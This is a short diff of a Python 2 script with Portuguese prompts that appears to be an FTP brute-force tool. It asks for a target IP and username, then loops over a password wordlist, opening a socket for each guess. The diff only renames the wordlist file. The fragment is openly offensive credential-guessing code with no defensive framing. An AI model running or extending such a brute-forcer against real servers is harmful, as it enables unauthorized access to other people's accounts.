@@ -23,7 +23,7 @@ if pedido == 1:
     print "Taxa de sucesso atualmente 26%"
     alvo = raw_input('Digite o ip alvo: ')
     usuario = raw_input('Digite o Usuario: ')
-    file = open("listafftp.txt")
+    file = open("ftpword.txt")
     for linha in file.readlines():
         print "Tentando com %s:%s "%(usuario,linha)
     	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
